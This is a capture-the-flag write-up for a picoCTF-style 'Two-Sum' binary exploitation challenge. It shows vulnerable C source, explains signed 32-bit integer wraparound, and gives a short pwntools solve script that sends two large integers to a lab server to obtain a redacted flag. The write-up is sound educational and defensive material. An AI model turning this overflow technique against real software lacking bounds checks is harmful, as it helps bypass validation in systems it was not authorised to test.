# CyLab — Two-Sum

* **Platform:** CyLab Security Academy / picoCTF 2023 (Challenge ID: `382`)
* **Category:** Binary Exploitation / Integer Overflow (Pwn)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, Source Analysis
* **Binary:** `flag` (x86_64 ELF)

---

## TL;DR

The challenge asks for two positive integers $n_1, n_2 > 0$ such that $n_1 > n_1 + n_2$ or $n_2 > n_1 + n_2$. In standard 32-bit signed two's-complement arithmetic, the maximum representable integer is $\text{INT\_MAX} = 2^{31} - 1 = 2{,}147{,}483{,}647$. By inputting two large positive integers (such as $2{,}000{,}000{,}000$ and $2{,}000{,}000{,}000$), their mathematical sum $4{,}000{,}000{,}000$ exceeds $\text{INT\_MAX}$ and wraps around into a negative number ($-294{,}967{,}296$). Because a positive number is strictly greater than a negative number, the condition is met and the flag is displayed.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file flag
flag: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=flag
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Key observations:
1. **Integer Arithmetic Focus:** The challenge explores undefined behavior / integer wraparound in C integer calculations.
2. **Standard 32-Bit Signed Integer Types:** The input variables `num1`, `num2`, and `sum` are declared as signed `int` (32 bits on modern x86_64 Linux).

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>

static int addIntOvf(int result, int a, int b) {
    if ((a > 0 && b > 0 && result < 0) || (a < 0 && b < 0 && result > 0))
        return -1;
    return 0;
}

int main() {
    int num1, num2, sum;
    printf("What two positive numbers can make this possible: \n");
    printf("n1 > n1 + n2 OR n2 > n1 + n2\n");
    printf("Enter two numbers: ");

    if (scanf("%d", &num1) && scanf("%d", &num2)) {
        sum = num1 + num2;      // VULNERABILITY: Signed integer overflow wraps around
        if (addIntOvf(sum, num1, num2) == -1) {
            printf("You have entered the right numbers\n");
            if (num1 > 0 || num2 > 0) {
                // Read and print flag.txt
                FILE *f = fopen("flag.txt", "r");
                char flag[64];
                fgets(flag, 64, f);
                puts(flag);
            }
        }
    }
    return 0;
}
```

### 2. Two's-Complement Representation & Wraparound

In 32-bit signed arithmetic:
- $\text{Range}: [-2^{31}, 2^{31}-1] = [-2{,}147{,}483{,}648, 2{,}147{,}483{,}647]$
- Binary representation of $\text{INT\_MAX}$: `01111111 11111111 11111111 11111111` ($0\text{x}7FFFFFFF$)
- If $n_1 = 2 \times 10^9$ and $n_2 = 2 \times 10^9$:
  $$n_1 + n_2 = 4 \times 10^9 = 0\text{x}EE6B2800$$
- In two's-complement notation, the most significant bit (sign bit) is $1$, interpreting the value as:
  $$4{,}000{,}000{,}000 - 2^{32} = 4{,}000{,}000{,}000 - 4{,}294{,}967{,}296 = -294{,}967{,}296$$

```text
    0x77359400 (2,000,000,000 > 0)
  + 0x77359400 (2,000,000,000 > 0)
  --------------------------------
    0xEE6B2800 (-294,967,296 < 0)  <-- Sign bit set (wraparound)
```

Condition verification:
- $a = 2{,}000{,}000{,}000 > 0$ (True)
- $b = 2{,}000{,}000{,}000 > 0$ (True)
- $\text{sum} = -294{,}967{,}296 < 0$ (True)
- Result: `addIntOvf()` returns `-1`, triggering the flag read routine.

---

## Dynamic Analysis & Exploitation Strategy

1. **Input Crafting:**
   We supply two numbers separated by a space:
   ```text
   2000000000 2000000000
   ```
2. **Execution:**
   The `scanf` parser ingests both values as decimal integers into 32-bit registers. The CPU performs addition with the `add` instruction, which sets the overflow flag `OF` and sign flag `SF`. The resulting variable `sum` holds the negative integer, satisfying `addIntOvf() == -1`.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, sys
from pwn import *

context.log_level = "info"
HOST, PORT = "xebec.cylabacademy.net", 15339

def solve(io):
    io.recvuntil(b"positive numbers")
    # Send two large positive 32-bit integers whose sum exceeds INT_MAX
    io.sendline(b"2000000000 2000000000")
    data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./flag") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to xebec.cylabacademy.net on port 15339: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to xebec.cylabacademy.net port 15339
```

---

## Key Takeaways & Lessons

1. **Arithmetic Boundary Limits:** Signed 32-bit integers wrap from positive to negative when passing $2^{31}-1$. Any calculation relying on assumptions like $a + b > a$ for positive numbers will fail if inputs are not bounds-checked.
2. **Undefined Behavior vs. Architecture Realities:** In C, signed integer overflow is technically undefined behavior (UB), but on standard x86/x64 hardware without `-ftrapv` or sanitizers, it compiles directly to modulo $2^{32}$ two's complement addition.
3. **Safe Integer Arithmetic in C:** Modern applications should use safe integer arithmetic APIs (e.g. GCC builtins `__builtin_add_overflow()`) or cast operands to larger integer types before performing validation.
